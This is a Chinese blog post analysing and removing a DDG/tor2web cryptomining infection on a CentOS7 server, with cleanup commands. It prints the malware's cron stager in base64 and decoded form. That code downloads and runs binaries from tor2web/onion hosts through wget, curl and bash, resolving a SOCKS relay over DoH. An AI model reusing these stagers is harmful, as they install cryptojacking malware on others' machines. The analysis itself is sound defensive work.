---
layout:     post
title:      CentOS7 服务器分析挖矿病毒，清理挖矿病毒 tor2web
subtitle:   清理挖矿病毒 tor2web
date:       2020-10-06
author:     Jerry
header-img: img/post-bg-ios9-web.jpg
catalog: true
tags:
    - CentOS7服务器
    - 挖矿病毒
	- 清理病毒
---

> CentOS7 服务器分析挖矿病毒，清理挖矿病毒 tor2web
> 
> [CentOS7 服务器分析并清理挖矿病毒]

#特征如下：

 

 

 

CPU占用一直比较高，初步分析是挖矿程序：

系统的crontab –l显示调度列表如下：

 

 

 

 

20 * * * * /root/.aliyun.sh >/dev/null 2>&1

查看脚本内容：

1
2
3
#!/bin/bash
exec &>/dev/null
echo ZXhlYyAmPi9kZXYvbnVsbApleHBvcnQgUEFUSD0kUEFUSDovYmluOi9zYmluOi91c3IvYmluOi91c3Ivc2JpbjovdXNyL2xvY2FsL2JpbjovdXNyL2xvY2FsL3NiaW4KdD10cnVtcHM0YzRvaHh2cTdvCmRpcj0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmZvciBpIGluIC91c3IvYmluICRkaXIgL2Rldi9zaG0gL3RtcCAvdmFyL3RtcDtkbyB0b3VjaCAkaS9pICYmIGNkICRpICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp4KCkgewpmPS9pbnQKZD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCndnZXQgLXQxIC1UMTAgLXFVLSAtLW5vLWNoZWNrLWNlcnRpZmljYXRlICQxJGYgLU8kZCB8fCBjdXJsIC1tMTAgLWZzU0xrQS0gJDEkZiAtbyRkCmNobW9kICt4ICRkOyRkO3JtIC1mICRkCn0KdSgpIHsKeD0vY3JuCndnZXQgLXQxIC1UMTAgLXFVLSAtTy0gLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAkMSR4IHx8IGN1cmwgLW0xMCAtZnNTTGtBLSAkMSR4Cn0KZm9yIGggaW4gdG9yMndlYi5pbyA0dG9yLm1sIG9uaW9uLm1uIG9uaW9uLmluLm5ldCBvbmlvbi50byBkMndlYi5vcmcgY2l2aWNsaW5rLm5ldHdvcmsgb25pb24ud3Mgb25pb24ubnogb25pb24uZ2xhc3MgdG9yMndlYi5zdQpkbwppZiAhIGxzIC9wcm9jLyQoY2F0IC90bXAvLlgxMS11bml4LzAwKS9pbzsgdGhlbgp4IHRydW1wczRjNG9oeHZxN28uJGgKZWxzZQpicmVhawpmaQpkb25lCgppZiAhIGxzIC9wcm9jLyQoY2F0IC90bXAvLlgxMS11bml4LzAwKS9pbzsgdGhlbgooCnUgJHQudG9yMndlYi5pbyB8fAp1ICR0LjR0b3IubWwgfHwKdSAkdC5kMndlYi5vcmcgfHwKdSAkdC5vbmlvbi5tbiB8fAp1ICR0Lm9uaW9uLmluLm5ldCB8fAp1ICR0Lm9uaW9uLnRvIHx8CnUgJHQuY2l2aWNsaW5rLm5ldHdvcmsgfHwKdSAkdC5vbmlvbi5wZXQgfHwKdSAkdC50b3Iyd2ViLnN1IHx8CnUgJHQub25pb24uZ2xhc3MgfHwKdSAkdC5vbmlvbi53cwopfGJhc2gKZmkK|base64 -d|bash
　　


使用bash64解密后内容：

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
exec &>/dev/null
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
t=trumps4c4ohxvq7o
dir=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)
for i in /usr/bin $dir /dev/shm /tmp /var/tmp;do touch $i/i && cd $i && rm -f i && break;done
x() {
f=/int
d=./$(date|md5sum|cut -f1 -d-)
wget -t1 -T10 -qU- --no-check-certificate $1$f -O$d || curl -m10 -fsSLkA- $1$f -o$d
chmod +x $d;$d;rm -f $d
}
u() {
x=/crn
wget -t1 -T10 -qU- -O- --no-check-certificate $1$x || curl -m10 -fsSLkA- $1$x
}
for h in tor2web.io 4tor.ml onion.mn onion.in.net onion.to d2web.org civiclink.network onion.ws onion.nz onion.glass tor2web.su
do
if ! ls /proc/$(cat /tmp/.X11-unix/00)/io; then
x trumps4c4ohxvq7o.$h
else
break
fi
done
 
if ! ls /proc/$(cat /tmp/.X11-unix/00)/io; then
(
u $t.tor2web.io ||
u $t.4tor.ml ||
u $t.d2web.org ||
u $t.onion.mn ||
u $t.onion.in.net ||
u $t.onion.to ||
u $t.civiclink.network ||
u $t.onion.pet ||
u $t.tor2web.su ||
u $t.onion.glass ||
u $t.onion.ws
)|bash
Fi
　　


结合腾讯安全预警： https://cloud.tencent.com/developer/article/1402851

http://bbs.qcloud.com/thread-30706-1-1.html?_ga=1.176497829.1600736125.1550482092

分析是DDG挖矿木马病毒。

此外，发现.ssh下的known_hosts被添加如下一条公钥记录

 

 

 

主机hosts中也添加了如下记录：

 

1
2
3
4
5
6
0.0.0.0 aliyun.one
0.0.0.0 lsd.systemten.org
0.0.0.0 pastebin.com
0.0.0.0 pm.cpuminerpool.com
0.0.0.0 systemten.org
　　

此外，病毒还会在后台设置守护进程，查看方式

1
ls -al  /tmp/.X11-unix/
　　

 

 


查看该目录下的 00、11、22内容可以看到几个数字，00文件存放病毒守护进程pid、11文件存放病毒运行进程pid、22为一个空文件，功能暂时不清楚。

 

 

 

9423为病毒守护进程pid

15043为病毒正在运行的pid

 

 

 

可以看到守护进程内容

1
sh -c echo ZXhlYyAmPi9kZXYvbnVsbApleHBvcnQgUEFUSD0kUEFUSDovYmluOi9zYmluOi91c3IvYmluOi91c3Ivc2JpbjovdXNyL2xvY2FsL2JpbjovdXNyL2xvY2FsL3NiaW4KCmQ9JChncmVwIHg6JChpZCAtdSk6IC9ldGMvcGFzc3dkfGN1dCAtZDogLWY2KQpjPSQoZWNobyAiY3VybCAtNGZzU0xrQS0gLW0yMDAiKQp0PSQoZWNobyAidHJ1bXB6d2x2bHlydmxzcyIpCgpzb2NreigpIHsKcD0kKGVjaG8gImRucy1xdWVyeT9uYW1lPXJlbGF5LnRvcjJzb2Nrcy5pbiIpCnM9JCgoJGMgaHR0cHM6Ly9kb2guY2VudHJhbGV1LnBpLWRucy5jb20vJHAgfHwKICAgICAkYyBodHRwczovL2Rucy50d25pYy50dy8kcCB8fAogICAgICRjIGh0dHBzOi8vZG5zLnJ1YnlmaXNoLmNuLyRwIHx8CiAgICAgJGMgaHR0cHM6Ly9kb2guZG5zLnNiLyRwIDsgaG9zdCAtVyA1IHJlbGF5LnRvcjJzb2Nrcy5pbnxhd2sgeydwcmludCAkTkYnfSlcCiAgICAgfCBncmVwIC1vRSAiXGIoWzAtOV17MSwzfVwuKXszfVswLTldezEsM31cYiIgfHRyICcgJyAnXG4nfHNvcnQgLXVSfGhlYWQgLTEgKQp9CgpmZXhlKCkgewpmb3IgaSBpbiAkZCAvdG1wIC92YXIvdG1wIC9kZXYvc2htIC91c3IvYmluIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9Cgp1KCkgewpzb2NregpmZXhlCmY9L2NwdQp4PS4vJChkYXRlfG1kNXN1bXxjdXQgLWYxIC1kLSkKJGMgLXggc29ja3M1aDovLyRzOjkwNTAgJHQub25pb24kZiAtbyR4IHx8ICRjICQxJGYgLW8keApjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaW8gdG9yMndlYi50byB0b3Iyd2ViLnN1CmRvCmlmICEgbHMgL3Byb2MvJChoZWFkIC0xIC90bXAvLlgxMS11bml4LzExKS9pbzsgdGhlbgp1ICR0LiRoCmVsc2UKYnJlYWsKZmkKZG9uZQo= |base64 -d|bash
　　


使用base64解密后内容如下：

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
exec &>/dev/null
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
 
d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)
c=$(echo "curl -4fsSLkA- -m200")
t=$(echo "trumpzwlvlyrvlss")
 
sockz() {
p=$(echo "dns-query?name=relay.tor2socks.in")
s=$(($c https://doh.centraleu.pi-dns.com/$p ||
$c https://dns.twnic.tw/$p ||
$c https://dns.rubyfish.cn/$p ||
$c https://doh.dns.sb/$p ; host -W 5 relay.tor2socks.in|awk {'print $NF'})\
| grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" |tr ' ' '\n'|sort -uR|head -1 )
}
 
fexe() {
for i in $d /tmp /var/tmp /dev/shm /usr/bin ;do echo exit > $i/i && chmod +x $i/i && cd $i && ./i && rm -f i && break;done
}
 
u() {
sockz
fexe
f=/cpu
x=./$(date|md5sum|cut -f1 -d-)
$c -x socks5h://$s:9050 $t.onion$f -o$x || $c $1$f -o$x
chmod +x $x;$x;rm -f $x
}
 
for h in tor2web.in tor2web.io tor2web.to tor2web.su
do
if ! ls /proc/$(head -1 /tmp/.X11-unix/11)/io; then
u $t.$h
else
break
fi
done
　　


内容还是比较清晰的。

清理病毒：

kill -9 35138 && kill -9 9423 && rm -rf /etc/cron.d/0wlvly && rm -rf /var/spool/cron/root && chattr -i /root/.wlvly.sh && rm -rf /root/.wlvly.sh && chattr -i /opt/wlvly.sh && rm -rf /opt/wlvly.sh
创建免疫文件夹，防止再次感染：

mkdir /root/wlvly.sh && chmod 000 /root/wlvly.sh && mkdir /opt/wlvly.sh && chmod 000 /opt/wlvly.sh

原文链接：https://blog.csdn.net/TankRuning/article/details/103527323


#### 备注：